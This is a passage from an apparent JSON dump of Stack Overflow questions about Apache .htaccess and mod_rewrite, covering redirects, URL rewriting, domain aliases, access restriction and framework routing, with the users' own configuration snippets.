allow open access to entire site for those IPs:\nallow from xx.xx.xxx.xx.xxx\nSatisfy any\n</code></pre>\n\n<p>When I go to a subfolder, it keep asking for a login and password, but when I click on \"Cancel\" to cancel that login, everything goes fine and no other box is shown.\nAll I want is to not have this box shown.</p>\n\n<p>Thanks !</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":6,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":5225,"score":4,"question_id":595005,"title":"Redirect requests only if the file is not found?","body":"<p>I'm hoping there is a way to do this with mod_rewrite and Apache, but maybe there is another way to consider too.</p>\n\n<p>On my site, I have directories set up for re-skinned versions of the site for clients.  If the web root is /home/blah/www, a client directory would be /home/blah/www/clients/abc.  When you access the client directory via a web browser, I want it to use any requested files in the client directory if they exist.  Otherwise, I want it to use the file in the web root.  For example, let's say the client does not need their own index.html.  Therefore, some code would determine that there is no index.html in /home/blah/www/clients/abc and will instead use the one in /home/blah/www.  Keep in mind that I don't want to redirect the client to the web root at any time, I just want to use the web root's file with that name if the client directory has not specified its own copy.  The web browser should still point to /clients/abc whether the file exists there or in the root.  Likewise, if there is a request for news.html in the client directory and it DOES exist there, then just serve that file instead of the web root's news.html.  The user's experience should be seamless.</p>\n\n<p>I need this to work for requests on any filename.  If I need to, for example, add a new line to .htaccess for every file I might want to redirect, it rather defeats the purpose as there is too much maintenance needed, and a good chance for errors given the large number of files.</p>\n\n<p>In your examples, please indicate whether your code goes in the .htaccess file in the client directory, or the web root.  Web root is preferred.</p>\n\n<p>Thanks for any suggestions!  :)</p>\n"},{"tags":[".htaccess","url","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12253919,"title":".htaccess - how to rewrite url without parameters","body":"<p>Hi i've got another question</p>\n\n<p>i have the simplest htaccess </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</code></pre>\n\n<p>it gives me friendly urls eg. www.mysite.loc/blog/</p>\n\n<p>but i want to go further and have eg. <code>www.mysite.loc/blog/?page=1</code> and <code>www.mysite.loc/blog/?page=1&amp;id=1</code></p>\n\n<p>how can i do that ?</p>\n\n<p>P.S. i've tried many solutions that i've found in google but nothing works</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12252273,"title":"Why does this htaccess work for a bit, and then doesnt?","body":"<p>I'm trying to redirect people to a new url of the login page,\nIt used to work, I made a few changes though, which kind of failed as I'm still trying to learn how to use htaccess, \nAnyhow I brought the very first code back, and for some awkward reason, it won't work anymore,</p>\n\n<p>Here's the code:</p>\n\n<pre><code># external redirect using R=301 to /login from /index.php?act=Login\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s/+(index\\.php/?|)\\?act=Login(&amp;|\\s) [NC]\nRewriteRule ^/login? [R=301,L]\n</code></pre>\n\n<p>Is there any better way to achieve what I need?</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","rewrite","file-extension"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12251614,"title":"Using htaccess to rewrite unless ending in a file extension","body":"<p>How would we use the htaccess file to rewrite all URLs to index.php unless they end in a file extension.</p>\n\n<p>The following:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^index.php$ - [L]\nRewriteRule ^(.*)$ index.php [L,QSA]\n</code></pre>\n\n<p>Is rewriting everything. If the file ends in .php / .jpg / .css / .js etc.... etc... I would like it not to redirect and instead go to that file.</p>\n\n<p>How is that done?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12248788,"title":"Redirecting all domain aliases to one with htaccess","body":"<p>I have a few domain aliases, while I only want one of them to be actually used.\nAt the moment, I have two domains installed, </p>\n\n<p>To redirect I'd like to use htaccess.</p>\n\n<p>My domains currently work like so:</p>\n\n<p>www.domain.com/index.html - Main domain's home page</p>\n\n<p>www.secondDomain.com/index.html - Displays exactly the same home page as the main domain, but I want it to automatically rename the url to www.domain.com/index.html when it's used.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","redirect","url-rewriting","url-routing"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12244025,"title":"Redirect all URL except one query string","body":"<p>I have 2 domain <code>mcleancenter.org</code> and <code>aldentheatre.org</code>,Both pointing to one directory. I want to redirect all <code>URLs</code> which don't have <code>\"alden-theatre\"</code> to <code>mcleancenter.org</code>. And all URLs which have <code>\"alden-theatre\"</code> in <code>URLs</code> should redirect to <code>aldentheatre.org</code>.</p>\n\n<p>For example:</p>\n\n<ul>\n<li><code>/about</code> should redirect to <code>mcleancenter.org/about</code></li>\n<li><code>/contact</code> should redirect to <code>mcleancenter.org/contact</code></li>\n<li><code>/alden-theatre</code> should redirect to <code>aldentheatre.org/alden-theatre</code></li>\n<li><code>/alden-theatre/perfomance</code> should redirect to <code>aldentheatre.org/alden-theatre/perfomance</code></li>\n</ul>\n\n<p>Any Help is really appreciated.</p>\n"},{"tags":["linux",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12247927,"title":".htaccess works fine offline but not online","body":"<pre><code>  Options +FollowSymlinks\n\n  RewriteEngine on\n  RewriteRule !\\.(gif)$ c1.php [NC]\n</code></pre>\n\n<p>Is there anything wrong with this code?  whats the chmod need to be given to a .htaccess file, 755?</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12247488,"title":"PHP - Adding a Trailing Slash (.php/) Results in the Page displaying with Errors","body":"<p>I've currently come across a problem with my site. If someone types in <a href=\"http://mysite.com/index.php\" rel=\"nofollow\">http://mysite.com/index.php</a>, it works fine and displays index.php as it should. However, if someone types in <a href=\"http://mysite.com/index.php/\" rel=\"nofollow\">http://mysite.com/index.php/</a>, index.php loses most of its images and now acts as being a folder, even though it is not. This happens on all my .php files.</p>\n\n<p>However, on other sites, this issue does not happen. I've been thinking of using this htaccess code:</p>\n\n<pre><code># Remove garbage info after .php\nRewriteRule ^([^.]+\\.php)[/.] http://www.example.com/$1 [R=301,L]\n</code></pre>\n\n<p>My question is basically...what is the best solution to this issue?\nIn addition, if I use thae htaccess RewriteRule I mentioned above, would pages like /test.php?id=5 be stripped down to just /test.php (basically removing everything after .php)?</p>\n\n<p>Thanks,<br>\nMark</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12247128,"title":"How to write a redirect with regular expression","body":"<p>I would like to redirect all incoming links  with htaccess from </p>\n\n<pre><code>/2011/05/16/xps-15z-dell-laesst-sich-vom-apple-macbook-inspirieren/\n</code></pre>\n\n<p>to </p>\n\n<pre><code>/xps-15z-dell-laesst-sich-vom-apple-macbook-inspirieren/\n</code></pre>\n\n<p>how would look the regex ?</p>\n"},{"tags":["security",".htaccess","codeigniter","robots"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12247040,"title":"How to restrict access to files in a folder in codeigniter","body":"<p>Hello I have used codeigniter to develop my website but when my website is searched in google , google shows up links to the files (pdf) in a particular folder and user can view these files (pdf) directly without login. I want to restrict google to directly show the links to these files. \nex: www.mywebsite/myfolder/myfile</p>\n\n<p>Please guide me how can I accomplish this. Thank you.</p>\n"},{"tags":["php","jquery",".htaccess","external"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":12246323,"title":"Prevent external acces to .php","body":"<p>Is there a way to block external acces to a .php file (like in the URL) and allow if the .php file got called by jquery post?</p>\n\n<p>Thanks!\nWouter0100</p>\n"},{"tags":["apache",".htaccess","url","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12246576,"title":"double slash after redirecting non-www to www","body":"<p>I used the following code to redirect non-www traffic to www traffic.</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<p>What happens is that when I look for tupples.com, I instead get www.tupples.com// and the browser displays and error saying that it got too many re-directs.</p>\n\n<p>any suggestions?</p>\n"},{"tags":["apache",".htaccess","google","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12244657,"title":"redirecting with htaccess while avoiding search engine penalty","body":"<p>I have a website that has been up for about 2 years now, it gained some search engine reputation over the time, and now I'm interested in using htaccess on it,\nto rename things such as:</p>\n\n<p>/index.php?act=Login\nto simply \n/Login</p>\n\n<p>Now the problem is, that search engines will see both urls, and the login page is far from being the only url I will rename.\nWhich pretty much means that my entire website will have double the urls it has now,\nWhat can I do to prevent it from causing damage to the SEO?</p>\n\n<p>Is there some line of htaccess code I could use to redirect the old pages to the new ones as well? (I'm not even sure if that'll solve the SEO issue)</p>\n\n<p>Thanks in advance</p>\n"},{"tags":[".htaccess","redirect","redirecttoaction"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12244842,"title":"301 Redirect ALL none existing links","body":"<p>I have had a look around at other posts but since i'm not a .htaccess wizard i can't quite figure out how to change the code to fit my needs.</p>\n\n<p>Basically i have a holding page. page for a site i am building and just want any link that doesn't exist to be redirected back the the holding page. </p>\n\n<p>I imagine it goes something like this?</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^www\\.example\\.co\\.uk$ [NC]\n#if not root\nRewriteCond %{REQUEST_URI} !^/?$ [NC]\n#redirect\nRewriteRule ^(.*)$ http://www.example.co.uk/$1 [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","url-routing"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12212580,"title":"i18n URIs with CI Routing or mod_rewrite","body":"<p>I'm trying to clean up my URIs on a multi-language CI site by changing the segment containing the language name to just the two-character language code.</p>\n\n<p>Currently, my URIs look like this:</p>\n\n<pre><code>http://example.com               //  Home (English)\nhttp://example.com/english/home  //  Home (English)\nhttp://example.com/home          //  404 (should go to english/home)\n\nhttp://example.com/sv            //  404 (should go to swedish/home)\nhttp://example.com/swedish/home  //  Home (Swedish)\nhttp://example.com/sv/home       //  404 (should go to swedish/home)\n</code></pre>\n\n<p>I have experimented both with <code>application/config/routes.php</code> and <code>.htaccess</code>, but I feel I'm not making much progress. Which should I be using? How can I achieve my desired results?</p>\n\n<p>As it stands, my files look like this:</p>\n\n<pre><code>// .htaccess\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /example/index.php/$1 [L]\n\n// application/config/routes.php (minus docs)\n&lt;?php\nif ( ! defined('BASEPATH')) exit('No direct script access allowed');\n$route['default_controller'] = \"pages/view/home\";\n$route['([a-z]+)/([a-z]+)'] = \"pages/view/$2\";\n?&gt;\n\n// application/controllers/page\n&lt;?php\n\nclass Pages extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n        $this-&gt;language = $this-&gt;uri-&gt;segment(1);\n    }\n\n    public function view ($page = 'home') {\n\n        if (!file_exists('application/views/pages/'.$page.'.php'))\n            show_404();\n\n        $data['title'] = $page;\n\n        $this-&gt;lang-&gt;load('general',$this-&gt;language);\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12238467,"title":"htaccess rewrite resulting in 500 Internal Server Error","body":"<p>I am trying to get pretty urls using htaccess for SLIR image resizing plugin.</p>\n\n<p>I want to rewrite something like below:</p>\n\n<p><strong>Before Rewrite:</strong><br>\nlocalhost/img/600x400/slider/image.jpg</p>\n\n<p><strong>After Rewrite</strong><br>\nlocalhost/application/public/slir/index.php?r=slir&amp;w=600&amp;h=400&amp;i=img/slider/image.jpg</p>\n\n<p>But the following code is returning a 500 Internal server error...</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine On\nRewriteBase /\n\nRewriteRule ^(.*)/([0-9]{1,4})x([0-9]{1,4})/(.*)\\.(gif|jpg|jpeg|png) application/public/slir/index.php?r=slir&amp;w=$2&amp;h=$3&amp;i=$1/$4.$5 [NC,NE,QSA,L]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Please help me.....</p>\n\n<hr>\n\n<h1><strong>UPDATE</strong></h1>\n\n<p>I thought it was a File Permissions issue...\nso I checked all the related directories and files, surprisingly there were all 755/644.<br>\nThen I directly checked the <strong>/application/public/slir/index.php</strong>. It was not accessible.  </p>\n\n<p>I created another file named <strong>hello.php</strong> in the same slir directory and <strong>hello.php</strong> was accessible.<br>\nThen I moved the SLIR directory to the another folder named <strong>public</strong>. Here, both the <strong>index.php</strong> and <strong>hello.php</strong> were accessible.</p>\n\n<p>After that, I moved SLIR directory to back to the original <strong>scripts</strong> folder. In <strong>scripts</strong> folder, <strong>hello.php</strong> is accessible but <strong>index.php</strong> is not accessible.<br>\nNow, Both files have same permissions and are in same folder.. I dont know what is happening here... :/ :/</p>\n\n<p><strong>Someone please help me......</strong></p>\n"},{"tags":["apache",".htaccess","mod-rewrite","requirejs","remote-debugging"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12117361,"title":"Remote Debugging Works Locally but not Remotely (on iPhone Safari)","body":"<p>I am trying to debug my local mobile website from my phone. My mobile website uses files from my main website, so whenever those files are requested, I redirect the request to the main website.</p>\n\n<p>This works in Chrome/Safari on my Mac, but I get the following error in my iPhone's Safari:</p>\n\n<pre><code>JavaScript: Error\nundefined\nError: Script error\nhttp://requirejs.org/docs/errors.html#scripterror\n</code></pre>\n\n<p>Here is my <code>.htaccess</code> code that does the rewriting:</p>\n\n<pre><code># models/collections/helpers/objects/libs\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteCond %{HTTP_HOST} ^(10\\.172\\.71\\.125|localhost)$ [NC]\nRewriteRule ^js/(models|collections|helpers|objects|libs)/(.*?)$ http://local.mysite.co/js/$1/$2 [L,QSA,R=302]\n</code></pre>\n\n<p>So it checks to see if it can find the file in the current document root (namely, my <code>/mobile</code> folder inside my main site), and when it notices that it can't be found, it requests it from my main website (<code>local.mysite.co</code>, which I have set in Apache to be located at <code>/</code>).</p>\n\n<p>My guess is that the error is giving the requirejs link because I use requirejs to load my files, and since they can't be found (on my iPhone's Safari), it throws that error.</p>\n\n<p>I am using <code>http://10.172.71.125/</code> as my URL (on both my laptop and iPhone), and it only works on my laptop.</p>\n\n<p>I'm out of ideas here :( Can anyone help me? Thanks in advance.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12240903,"title":"URL Rewrite and get the query string of two different vars with htaccess","body":"<p>What I'm trying to do is use the same URL with different query strings to go to two different pages. </p>\n\n<p>What I have right now is a URL's that looks like this </p>\n\n<p><code>http://mysite.com/embed?a=somestring</code> and <code>http://mysite.com/embed?b=somestring</code></p>\n\n<p>I need to get a rewrite rule that will redirect both to two different URL's depending on if the query var is a or b</p>\n\n<p>This below works but it matches both URL's and sends it to the one link</p>\n\n<pre><code>RewriteRule ^embed$ index.php?page=embeda [QSA]\n</code></pre>\n\n<p>If I do these two it doesn't work and will always match the first one. </p>\n\n<pre><code>RewriteRule ^embed$ index.php?page=embeda [QSA]\nRewriteRule ^embed$ index.php?page=embedb [QSA]\n</code></pre>\n\n<p>Not sure how to do two different rewriterules for this.</p>\n"},{"tags":[".htaccess","symfony2","amazon-ec2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":573,"score":0,"question_id":9802735,"title":"Symfony2 .htaccess issue","body":"<p>I have a Symfony2 app deployed on EC2 instance in amazon.</p>\n\n<p>I try to rewrite a.htaccess to modify the address:</p>\n\n<p><a href=\"http://ec2-xxxxxxxxxxx.eu-west-1.compute.amazonaws.com/symfony/web/app.php/mysite\" rel=\"nofollow\">http://ec2-xxxxxxxxxxx.eu-west-1.compute.amazonaws.com/symfony/web/app.php/mysite</a></p>\n\n<p>The problem is modify /symfony/web/app.php to show just /mysite</p>\n\n<p>What i need to modify in the .htaccess?</p>\n\n<p>Thanks</p>\n"},{"tags":["wordpress",".htaccess","index","directory","external"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12240391,"title":"Index in root, wordpress in subdirectory","body":"<p>Okay I've googled this for hours...I installed wordpress to a subdirectory as a content management system, but I want my main index.php along with other files to remain in the root.</p>\n\n<p>What .htaccess code or wordpress settings do I need to use so that the main url <a href=\"http://foo.com/index.php\" rel=\"nofollow\">http://foo.com/index.php</a> doesn't look for the wordpress/index.php (which of course causes the error \"Warning: require(./wp-blog-header.php) [function.require]: failed to open stream: No such file or directory in /home/...\"</p>\n"},{"tags":["php",".htaccess","watermark"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12237845,"title":"How to get source file by php script from .htaccess Action/AddHandler","body":"<p>I making a simple script to add a watermark image to all image files in directory.</p>\n\n<p>So, I have .htaccess:</p>\n\n<pre><code>AddHandler watermarked .jpg \nAddHandler watermarked .jpeg \nAddHandler watermarked .gif \nAddHandler watermarked .png \n\nAction watermarked /spimg/vitowatermark.php \n</code></pre>\n\n<p>So, now on each image request from this directory, vitowatermark.php is working.</p>\n\n<p>How can I get source image file, user requested from my PHP script, to put watermark on it and generate answer?</p>\n\n<p>Thanks.</p>\n"},{"tags":[".htaccess","redirect","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12237579,"title":"How to use Errordocument 404 with 301 in header?","body":"<p>I have a dynamic content website and I want to redirect all non existed pages to index page but with the header showing 301 permanent redirect and not the 404 error.</p>\n\n<p>I know that I can redirect with .htaccess</p>\n\n<pre><code>Errordocument 404 /index.php\n</code></pre>\n\n<p>But this will have the 404 status in the header, and I'd rather the header to show a 301 redirect.</p>\n\n<p>Is this possible?</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":12229797,"title":"how to use mod_rewrite with godaddy","body":"<p>I am using godaddy linux shared hosting and i am having some problem with mod_rewrite.\nI am not much familier with mod_rewrite\nmy code is</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^\\.]+)$ $1.php [NC,L] \nRewriteRule readfile.php(.*)$ seceretfile.php?$1 [L,QSA]\n</code></pre>\n\n<p>this code works file on my localhost but online it doesn't work when i go to readfile.php it shows file not found AND also when i type a file without .php extension it shows an error?</p>\n"},{"tags":["apache",".htaccess","google","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12235808,"title":"htaccss RewriteRule - Remove .html and query from URL","body":"<p>I have some \"dirty\" urls in Google cache and index which keep popping up.</p>\n\n<p>I've made efforts to remove them, but in the meanwhile I would like to create a redirect using a htaccess RewriteRule.</p>\n\n<p>I've had partial success, but not complete.</p>\n\n<p>Original URL\n<a href=\"http://www.domain.net/folder/132-article-title\" rel=\"nofollow\">http://www.domain.net/folder/132-article-title</a><strong>.html?tmpl=component&amp;type=raw</strong></p>\n\n<p>Rewrite URL\n<a href=\"http://www.domain.net/folder/132-article-title\" rel=\"nofollow\">http://www.domain.net/folder/132-article-title</a></p>\n\n<p>So far I've got </p>\n\n<pre><code>RewriteRule ^(.*)\\.html(.*) http://www\\.domain\\.net/$1 [L,R=301] \n</code></pre>\n\n<p>But all it's doing is removing <strong>.html</strong> from the URL.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","redirect","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12236529,"title":"mod_rewite .htaccess subdomain redirect","body":"<p>I spend the last 2 days searching and learning about .htaccess to redirect all subdomains to a user folder\nwithout changing the url, but i keep having 3 little problems. I really would appreciate some help</p>\n\n<p>problem 1)</p>\n\n<p>If i go to <code>http://www.domain.com/users/foo</code> it automatically redirect\nthe url to <code>http://foo.domain.com/</code> but if i go to <code>http://www.domain.com/users/foo/dashboard.php</code> \nit does nothing, instead of redirecting to <code>http://foo.domain.com/dashboard.php</code></p>\n\n<p>this is the code i use:</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /users/(.+)/\\ HTTP/\nRewriteRule ^users/([^/]+)/(.*)$ http://$1.domain.com/$2 [R=301,L]\n</code></pre>\n\n<p>problem 2)</p>\n\n<p>if i go to <code>http://foo.domain.com/dashboard.php</code></p>\n\n<p>it gets its information from <code>http://www.domain.com/users/foo/dashboard.php</code></p>\n\n<p>but if i type <code>foo.domain.com</code> in the adress bar (in firefox) it (sometimes) automatically redirect\nto <code>www.foo.domain.com</code>, can i prevent the <code>www</code> prefix?</p>\n\n<p>this is the code</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/users/\nRewriteCond %{HTTP_HOST} !^www\\.domain\\.com [NC]\nRewriteCond %{HTTP_HOST} ([^.]+)\\.domain\\.com\nRewriteRule (.*) /users/%1/$1 [L]\n</code></pre>\n\n<p>problem 3)</p>\n\n<p>the campaign website is locaded in the folder <code>http://www.domain.com/website</code> but should be\nvisible on the url <code>http://www.domain.com/</code> (like i get the information from <code>http://www.domain.com/users/foo</code>\non the url <code>http://foo.domain.com/</code>).</p>\n\n<p>i really appreciate the help, thanks</p>\n"},{"tags":["php",".htaccess","symfony2","assetic"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":12235501,"title":"problems with symfony2 images (403 forbidden)","body":"<p>I uploaded symfony2 project to servergrove.com and after this created assets using</p>\n\n<pre><code>php app/console assets:install --symlink web\n</code></pre>\n\n<p>and also</p>\n\n<pre><code>php app/console assetic:dump --env=prod --no-debug\n</code></pre>\n\n<p>After these steps I can't access images in the <code>web/bundles</code> folder, I get a \"403 forbidden\" error.</p>\n\n<p>The URL to my site is <a href=\"http://myserjtankian.com.preview-sg111.servergrove.com/\" rel=\"nofollow\">http://myserjtankian.com.preview-sg111.servergrove.com/</a></p>\n"},{"tags":[".htaccess","svg","subdomain","mime-types","html5boilerplate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":12235572,"title":"HTML5 Boilerplate > .htaccess > MIME types don't work on www subdomain","body":"<p>I've built a new website for my band. I've used HTML5 Boilerplate. The band logo is an SVG as a background for the H1 element.</p>\n\n<p>By default, the .htaccess file redirects all www.mydomain.com requests to mydomain.com. In this case, the logo is rendered without a problem.</p>\n\n<p>Our Google analytics is set up to look at www.mydomain.com, and now will not function anymore because those requests are forwarded to mydomain.com and it considers that to be a different website.</p>\n\n<p>The HTML5 Boilerplate .htaccess file comes with two redirect options: the default I described, and the reverse (mydomain.com to www.mydomain.com).</p>\n\n<p>When I commented the first option out, and uncommented the second option, the redirect worked fine but the logo stopped displaying.</p>\n\n<p>I've turned off both redirect options and loaded the image url directly in both versions, i.e. mydomain.com/img/logo.svg and www.mydomain.com/img/logo.svg. One rendered fine, the other was displayed as a text file.</p>\n\n<p>So I'm guessing the MIME Types that are added in the .htaccess file are not working for subdomains.</p>\n\n<p>I've added the MIME type in the DirectAdmin Web Control Panel that comes with our hosting, but that didn't resolve the problem, either.</p>\n\n<p>Does anyone know how to fix this, or how to work around it?</p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":9760189,"title":"It's possible to force download with .htaccess and a specific GET request (Dropbox style)?","body":"<p>I wonder if it's possible with <code>.htaccess</code> to force files to download only if there is a specific GET variable, just like Dropbox does.</p>\n\n<p>Example:</p>\n\n<pre><code>http://www.domain.com/file.mp4\n</code></pre>\n\n<p>the server just serves the file, while:</p>\n\n<pre><code>http://www.domain.com/file.mp4?dl\n</code></pre>\n\n<p>force the browser to download the file.</p>\n\n<p>PS: Using <code>PHP</code> with <code>readfile()</code> it's not a viable option in my case. Thanks.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12235437,"title":"Give priority to file rather directory in apache","body":"<p>Consider I have a file 'fg' and a folder 'fg' in the same directory. Now when user visit, he/she get content of file rather than content of directory. How to do this using .htaccess</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12234647,"title":"remove .php from file name using .htaccess","body":"<p>My current .htaccesss looks like:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nOptions +FollowSymLinks\nOptions -indexes\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule (.*)$ $1.php [NC]\n</code></pre>\n\n<p>Now I want when when a user visits '/abc/fgg.php', he/she will get 301 redirect to '/abc/fgg'. How to do this.</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12233582,"title":".htaccess rewriting one variable in url and adding directory","body":"<p>i want</p>\n\n<p>www.example.com/videos/all to call www.example.com/?display=all</p>\n\n<p>currently this is working partly</p>\n\n<pre><code>#videos display page\nRewriteRule ^videos/([^/\\.]+)/?$ /index.php?display=$1 [L,QSA]\n</code></pre>\n\n<p>This works when i search www.example.com/videos/all but some images don't show and once on the page if i click the link a href='http://www.example.com/videos/all' it calls www.example.com/videos/videos/all</p>\n\n<p>below is my full htaccess file</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteBase /\n\n#videos display page\nRewriteRule ^videos/([^/\\.]+)/?$ /index.php?display=$1 [L,QSA]\n\n# remove .php ONLY if requested directly\nRewriteCond %{THE_REQUEST} (\\.php\\sHTTP/1)\nRewriteRule ^(.+)\\.php$ /$1 [R=301,L,QSA]\n\n# remove trailing slash ONLY if it is not an existing folder\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)/$ /$1 [L,R=301]\n\n# rewrite to FILENAME.php if such file does exist and is not a folder\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ /$1.php [L,QSA]\n</code></pre>\n\n<p>thanks in advance. </p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12150451,"title":"htaccess value is not being passed to script $1 and $2","body":"<p>I am not exactly sure whats wrong, most-likely my htaccess is wrong. In any event there are two files on server one called \"club.php\" and other called \"image.php\" the club.php is re-written to look like a directory as such ex; club1</p>\n\n<p>the url would look like this without re-write ex; club.php?cid=1 <em>cid being club id</em></p>\n\n<p>now the image.php file goal is to call an image from database via path and to display it to user without exposing actual image path on the server.</p>\n\n<p>For this there are two values that are passed into query \"cid\" and \"type\". The problem with my current htaccess is that anytime there is a backslash added to the club1 it stops working and displaying data same happens for image.php which no longer works as well.</p>\n\n<p>Since i am using club1/some-page-name style architecture backslashes are required. But sadly they don't work with my current re-write rules.</p>\n\n<p>Here is my current htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n\n    RewriteRule ^club([0-9]+) index.php?clubID=$1 [L]\n\n    RewriteRule ^image/_header([0-9]+)_([0-9]+) image.php?cid=$1&amp;type=$2 [L]\n\n        &lt;IfModule mod_env.c&gt;\n             SetEnv SEO_SUPPORT 1\n        &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Could some one point out what I am doing wrong and what I can do to fix the backslash issue. Thank you kindly in advance.</p>\n\n<p>File Tree</p>\n\n<pre><code>http://localhost/dev1\n       - index.php\n       - image.php\n       - club.php\n       - .htaccess\n       -&gt; php\n          - db.class.php\n          - functions.class.php\n       -&gt; css\n          - menu.css\n       -&gt; js\n          - html5handler.js\n       -&gt; uploads\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","redirect","slash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12225979,"title":"How do I redirect to a page of my site taking the trailing slash as the language parameter using .htaccess","body":"<p>I have this rule which is not redirecting properly:</p>\n\n<pre><code>#redirect from www.mysite.com/page-NAME/es to www.mysite.com/public/index.php?page=NAME/es\nRewriteCond 